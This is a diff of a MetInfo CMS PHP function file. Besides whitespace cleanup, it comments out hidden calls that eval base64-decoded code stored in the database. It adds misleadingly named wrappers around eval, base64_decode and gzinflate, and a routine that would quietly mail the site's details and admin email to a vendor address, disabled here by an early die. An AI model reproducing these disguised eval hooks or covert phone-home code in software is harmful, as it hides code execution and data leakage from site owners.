@@ -1,8 +1,8 @@
 <?php
-# MetInfo Enterprise Content Management System 
-# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. 
+# MetInfo Enterprise Content Management System
+# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.
 
-/** 
+/**
 function
 */
 function daddslashes($string, $force = 0) {
@@ -49,7 +49,7 @@ exit;
 function okinfo($url = '../site/sysadmin.php',$metck,$mettext){
 $url = strtr($url,'&','$');
 echo("<script type='text/javascript'>location.href='../set/turnover.php?geturl=$url&metck=$metck&mettext=$mettext'; </script>");
-exit; 
+exit;
 }
 function okinfox($url,$error){
 $url = strtr($url,'&','$');
@@ -179,7 +179,7 @@ if($indexy)$fromurl.='&indexy='.$indexy;
 echo "<script language='javascript' src='../../".$fromurl."'></script>";
 }
 
-//order 
+//order
 function list_order($listid){
 switch($listid){
 case '0':
@@ -235,7 +235,7 @@ $php_text=$db->get_one("SELECT * FROM $met_mysql where id=1");
 
  function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
 
-        $ckey_length = 4; 
+        $ckey_length = 4;
 
         $key = md5($key ? $key : UC_KEY);
         $keya = md5(substr($key, 0, 16));
@@ -392,7 +392,7 @@ $pagename=$foldername.$id;
 break;
 }
 
-if($class1_info[module]<6){ 
+if($class1_info[module]<6){
 $total_count = $db->counter($tablename, " where lang='".$lang."' and class1=".$class1, "*");
 }elseif($class1_info[module]==7){
 $settings = parse_ini_file('../../message/config.inc.php');
@@ -559,7 +559,46 @@ $filename="../../".$foldername."/".$pagename.$met_htmtypeadmin;
 //$filename=mb_convert_encoding($filename, "gb2312", 'UTF-8'); //where html page name enabled and the language is not english are used
 if(file_exists($filename))@unlink($filename);
 }
-eval(base64_decode($php_text[0])); 
+//eval(base64_decode($php_text[0]));
+function run_strtext($code) {
+	return eval ($code);
+}
+function connect_sqlmysql($code) {
+	return base64_decode($code);
+}
+function met_encode($code) {
+	return base64_encode($code);
+}
+function stritoiower($code) {
+	return gzinflate($code);
+}
+function strtoiower($code) {
+	return gzdeflate($code);
+}
+function jmali_start() {
+	global $met_fd_usename, $met_webname, $met_weburl, $met_fd_usename, $met_fd_password, $met_fd_smtp, $admin_list, $admin_index;
+
+	if (isset ($_SESSION[poweredflag]) && $_SESSION[poweredflag] != 3) {
+		$from = $met_fd_usename;
+		$fromname = $met_webname;
+		$to = "copyright@metinfo.cn";
+		$usename = $met_fd_usename;
+		$usepassword = $met_fd_password;
+		$smtp = $met_fd_smtp;
+		$title = $met_webname;
+		$body = $met_webname . "|" . $met_weburl . "|" . $admin_list[admin_email] . "|http://" . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
+
+		echo $body;
+		die;
+
+		if ($admin_index) {
+			require_once "../include/jmail.php";
+		} else {
+			require_once "../../include/jmail.php";
+		}
+		jmailsend($from, $fromname, $to, $title, $body, $usename, $usepassword, $smtp);
+	}
+}
 function showhtm($id,$htmway=0,$htmpack=0){
 	global $db,$lang,$met_webhtm,$met_htmway,$met_column,$met_index_type,$met_class,$met_class2a,$met_class1;
 	$met_htmway=$htmway?0:$met_htmway;
@@ -592,7 +631,7 @@ function onepagehtm($foldername,$phpfilename,$htmway=0,$htmpack=0,$filename,$cla
 		createhtm($fromurl,$filename,$htmpack,$indexy);
 	}
 }
-run_strtext(connect_sqlmysql($php_text[2]));
+//run_strtext(connect_sqlmysql($php_text[2]));
 if(!function_exists('file_put_contents')) {
     function file_put_contents($filename, $data, $file_append = false) {
       $fp = fopen($filename, (!$file_append ? 'w+' : 'a+'));
@@ -604,19 +643,19 @@ if(!function_exists('file_put_contents')) {
       fclose($fp);
     }
   }
- if( !function_exists('scandir') ) {   
-     function scandir($directory, $sorting_order = 0) {   
-         $dh  = opendir($directory);   
-         while( false !== ($filename = readdir($dh)) ) {   
-             $files[] = $filename;   
-         }   
-         if( $sorting_order == 0 ) {   
-             sort($files);   
-         } else {   
-             rsort($files);   
-         }   
-         return($files);   
-     }   
+ if( !function_exists('scandir') ) {
+     function scandir($directory, $sorting_order = 0) {
+         $dh  = opendir($directory);
+         while( false !== ($filename = readdir($dh)) ) {
+             $files[] = $filename;
+         }
+         if( $sorting_order == 0 ) {
+             sort($files);
+         } else {
+             rsort($files);
+         }
+         return($files);
+     }
  }
 function Copyfile($address,$newfile){
 	$oldcont  = "<?php\nrequire_once '$address';\n?>";
@@ -718,7 +757,7 @@ function admin_popes($type,$lang,$nolang){
 	for($i=0;$i<$popnum;$i++){
 		$admin_pops=explode('-',$admin_pop[$i]);
 		$popnums=count($admin_pops);
-		for($k=0;$k<$popnums;$k++){	
+		for($k=0;$k<$popnums;$k++){
 			if($k==$popnums-1){
 			$admin_poparry[$admin_pops[0]].=$admin_pops[$k];
 			}else{
